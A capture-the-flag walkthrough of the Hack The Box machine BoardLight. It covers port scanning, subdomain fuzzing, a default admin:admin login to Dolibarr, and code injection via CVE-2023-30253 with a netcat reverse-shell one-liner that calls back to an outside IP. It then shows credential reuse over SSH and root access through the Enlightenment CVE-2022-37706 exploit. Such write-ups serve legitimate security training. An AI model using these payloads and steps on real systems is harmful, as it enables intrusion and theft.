## HTB: BoardLight
Welcome to my walkthrough for BoardLight, an Easy-difficulty Linux machine on Hack The Box. This machine provides an excellent real-world scenario focusing on sub-domain enumeration, exploiting known vulnerabilities in open-source Content Management Systems (CMS), and escalating privileges through misconfigured binaries. In this guide, we will walk through the entire process from initial port scanning to securing root access, explaining the why behind every step. (Note- This lab may crash in-between multiple times so reset everytime your ping doesn't reach the target)

## 🎯 Objective
* Find the **User** flag.
* Escalate privileges and find the **Root** flag.

Start up the lab and connect using Open VPN to your own Kali instance (highly recommended)

## 🔍 Initial Reconnaissance (Port Scanning)
Every successful penetration test starts with reconnaissance. We need to find out what doors (ports) are open on the target machine and what services are running behind them so we can look for potential entry points. 

Before initiating the enumeration phase, let's export the target IP address as an environment variable for easier reference throughout the lab: `export target=<TARGET_IP>`

Then, we use the following **Nmap** command:
```
nmap -p- -Pn -A --min-rate 2000 --initial-rtt-timeout 50ms --max-rtt-timeout 150ms --max-retries 1 --stats-every 1m $target --open
```

Here is exactly what each flag does:

* **`-p-`**: Scans **all 65,535 ports** instead of just the top 1,000 default ports. Backdoors or uncommon services love to hide on higher ports.
* **`-Pn`**: Treats the host as online and skips the initial ping discovery. This is crucial because many Windows targets disable ICMP (ping) by default, which can cause Nmap to falsely report that the machine is down.
* **`-A`**: This is the "Aggressive" scan flag. It enables **OS detection**, **version scanning** (to see what software version is running on a port), and runs **default NSE scripts** to find basic vulnerabilities.
* **`--min-rate 2000`**: Forces Nmap to send packets at a minimum rate of 2,000 packets per second. This drastically speeds up the scan.
* **`--initial-rtt-timeout 50ms` / `--max-rtt-timeout 150ms`**: Controls how long Nmap waits for a response to a packet. By capping it at 150ms, we ensure Nmap doesn't hang forever on a slow or dropped packet.
* **`--max-retries 1`**: If a port doesn't respond, Nmap will only try to probe it one more time before moving on. This keeps the scan fast.
* **`--stats-every 1m`**: Prints a status update in your terminal every 1 minute so you know the scan hasn't frozen.
* **`--open`**: Efficient filter used to only show ports that are actively listening and accepting connections.

 ⚠️ **Beginner Tip:** While these speed optimizations (`--min-rate`, aggressive timeouts) are perfect for CTFs like TryHackMe, they can be very noisy and disruptive in real-world professional engagements. In a real pentest, this could trigger firewalls, alert blue teams, or crash fragile services!

 _Figure 1: Nmap Scan Result_

<img width="1253" height="578" alt="image-371" src="https://github.com/user-attachments/assets/a72cdf99-c85d-4749-a0d6-ca0c6779e992" />

 ## 🧩 Analyzing the Scan Results

When you run an Nmap scan and a massive wall of text pops up, your job isn't to memorize every single line. Your job is to look at the patterns and ask:

    "What is this server's primary job, and how can I use this information?"

#### <ins>The Big Picture: What is this machine?</ins>
As a beginner, instead of looking at these ports as random numbers, you should group them by their functional relationships:

We have exactly two open ports. This is a highly focused attack surface, which actually makes your job easier because it narrows down where the vulnerability must be.

🚪 Port 22: SSH (OpenSSH 8.2p1)

    What it is: Secure Shell, used for remote command-line access.

    The Reality: OpenSSH is notoriously robust. Unless you find leaked credentials, a misconfigured SSH key, or the target is running an incredibly rare, unpatched 0-day exploit, you will not get into the box by attacking this port directly.

    Our Move: File this away for later. Once we find credentials or a private key somewhere else on the system, we will use this port to log in and get a stable terminal.

🌐 Port 80: HTTP (Apache 2.4.41)

    What it is: A standard, unencrypted web server.

    The Reality: This is our primary gateway. The Nmap scan notes Site doesn't have a title, which usually implies one of three things: a generic default server page, a web app that relies on specific domain routing (Virtual Hosting), or an API endpoint.

    Our Move: This is where 100% of our immediate attention belongs.
	

## Website Enumeration
Step 1: Inspect the Webpage & Modify /etc/hosts

Open your browser and navigate to http://10.129.231.37.

_Figure 2: board.htb_

<img width="1279" height="709" alt="image-372" src="https://github.com/user-attachments/assets/dc1bdafa-c463-4f63-96d6-e1812c750f67" />

In the about section of the website, we have found the domain name so first we'll append that to our hosts file:
```
sudo echo "10.129.231.37  board.htb" >> /etc/hosts
```

### Subdomain brute-force
The source, pages, techstack doesn't have any clear vulnerabilities so I'll try subdomain brute force using ffuf (already tried feroxbuster to find any hidden directories but couldn't):
```
ffuf -u http://10.129.231.37 -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc all -ac 
```
Tip- If ffuf finds a hit, we must add that new subdomain to our local /etc/hosts file before we can browse to it in your browser.

_Figure 3: Ffuf Result_

<img width="1250" height="499" alt="image-373" src="https://github.com/user-attachments/assets/815bb65f-e202-4eae-9979-6734e98ef13a" />

We got crm.board.htb so we'll append that and try opening the webpage.
```
sudo echo "10.129.231.37  crm.board.htb board.htb" >> /etc/hosts
```

_Figure 4: crm.board.htb_

<img width="1283" height="624" alt="image-374" src="https://github.com/user-attachments/assets/5abf72f8-e4f8-44fa-b027-0a6e2e7fe4d1" />

## Foothold
### 1. Initial Access & Authentication Bypass
After identifying the crm subdomain via virtual host enumeration, the local /etc/hosts file was updated to route traffic to crm.board.htb. Upon navigating to the application, a Dolibarr ERP/CRM version 17.0.0 login interface was encountered.

A manual credential-stuffing attack was performed using default administrative combinations. Authenticated access to the management dashboard was successfully achieved using the following weak credentials:

    Username: admin

    Password: admin

_Figure 5: Login_

<img width="1282" height="401" alt="image-375" src="https://github.com/user-attachments/assets/e81d90eb-e2b6-4a7f-9cb5-6ad72adb1e49" />

### 2. Vulnerability Identification (CVE-2023-30253)
Vulnerability research was conducted for Dolibarr version 17.0.0, revealing exposure to CVE-2023-30253. This flaw allows an authenticated remote attacker to execute arbitrary code on the underlying host. The vulnerability stems from an improper sanitization bypass; while the application filters lowercase ?php tags to prevent code injection, it fails to account for uppercase input casing, such as ?PHP.

<ins>We first would create a new website to inject php code in one of its pages to exploit this CVE to get RCE.</ins>

_Figure 6: create new website_

<img width="1278" height="398" alt="image-376" src="https://github.com/user-attachments/assets/584c127b-fba7-492a-af28-c74b75e77e71" />

<ins>Click on the website icon and click on create after typing a website name. Under this new website create a page.</ins>

_Figure 7: create a page_

<img width="1279" height="631" alt="image-377" src="https://github.com/user-attachments/assets/7c046dc8-7339-4eb9-afea-d68222a5a733" />

_Figure 8: Click on Edit HTML Source_

<img width="1281" height="258" alt="image-378" src="https://github.com/user-attachments/assets/64c65888-2a29-4935-a33a-55b594ad75b0" />

Once the page is created, we then select Edit the HTML source and embed our PHP code:
```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.30 4455 >/tmp/f");?>
```

_Figure 9: Insert shell_

<img width="1272" height="361" alt="image-379" src="https://github.com/user-attachments/assets/18a089e8-121d-4d62-8733-d2d3bcf1bac5" />

Now set a listener on your host:
```
nc -lnvp 4455
```

<ins>After clicknig the save button on the script, click on binocular icon to preview the website which will create a shell back to the listener.</ins>

_Figure 10: Shell received_

<img width="535" height="94" alt="image-380" src="https://github.com/user-attachments/assets/a9de47a6-d283-4db8-9c81-58dfd32ac0f4" />

To stabalize shell use these commands:
```
script /dev/null -c /bin/bash
Ctrl+Z
stty raw -echo; fg
```

_Figure 11: Stabalize shell_

<img width="1250" height="209" alt="image-381" src="https://github.com/user-attachments/assets/3cd1278e-3d14-44a0-9590-9971860ca81a" />

#### Enumerating the files present, we find an interesting file containing credentials: /var/www/html/crm.board.htb/htdocs/conf/conf.php

_Figure 12: Found Creds_

<img width="1258" height="480" alt="image-382" src="https://github.com/user-attachments/assets/0db7e0a4-528f-4357-97cb-4bad8c44fe98" />

<ins>After enumeration /etc/passwd file, we found a user with /bin/bash access - larissa</ins>

_Figure 13: /etc/passwd_

<img width="1239" height="662" alt="image-383" src="https://github.com/user-attachments/assets/fb573dfd-b491-4468-877d-50a029dcf42c" />

<ins>After spraying the password found in conf - serverfun2$2023!! for larissa using ssh, we were able to login.</ins>

_Figure 14: ssh larissa_

<img width="1229" height="278" alt="image-384" src="https://github.com/user-attachments/assets/c6a27db1-fdb4-4d6e-bb73-d52593bd85f6" />

_Figure 15: Capture User Flag_

<img width="1227" height="101" alt="image-385" src="https://github.com/user-attachments/assets/263d9bef-3d5d-4f63-8696-1e9faf9f8a23" />

Upon further enumerating we observed that larissa doesn't have any sudo privileges. However after running:
```
find / -perm -4000 2>/dev/null
```

We found some interesting 'enlightenment' binaries. Let's try enumerating its version number:
```
enlightenment --version
```

_Figure 16: Enumerate Enlightenment_

<img width="1248" height="464" alt="image-386" src="https://github.com/user-attachments/assets/0b5486af-3d7c-4369-bfb4-284bf7f88609" />

Enlightenment version 0.23.1 immediately stood out. A quick search for vulnerabilities impacting this version pointed directly to CVE-2022-37706, a severe local privilege escalation flaw affecting Enlightenment versions prior to 0.25.4.

Why does this work? The enlightenment_sys binary has the SUID bit enabled and is owned by root. Because its internal library mishandles specific path structures—specifically path names starting with a /dev/.. substring—it can be tricked into breaking out of its intended directory constraints. Since it runs with root permissions, this directory traversal allows an unprivileged user to escalate straight to root.

With the attack vector clear, I downloaded a public Proof of Concept (PoC) exploit script to my local machine to transfer it over:
```
wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/main/exploit.sh
python3 -m http.server 2000
wget http://10.10.16.30:2000/exploit.sh
```

_Figure 17: Download exploit_

<img width="616" height="306" alt="image-387" src="https://github.com/user-attachments/assets/05091fd5-9758-4f3f-a7ff-93e928f0c88f" />

_Figure 18: Transferred to target_

<img width="615" height="147" alt="image-388" src="https://github.com/user-attachments/assets/07f9943b-7443-4c3d-8de1-074b95f49824" />

Now, we will run the exploit on target and gain root access.
```
bash exploit.sh
```

_Figure 19: Run Exploit_

<img width="424" height="145" alt="image-389" src="https://github.com/user-attachments/assets/8e94969d-7df8-425b-8ca5-346bdfb263a7" />

_Figure 20: Capture Root Flag_

<img width="582" height="113" alt="image-390" src="https://github.com/user-attachments/assets/5f767cfd-0698-42d6-a989-56f7ff99b0c5" />
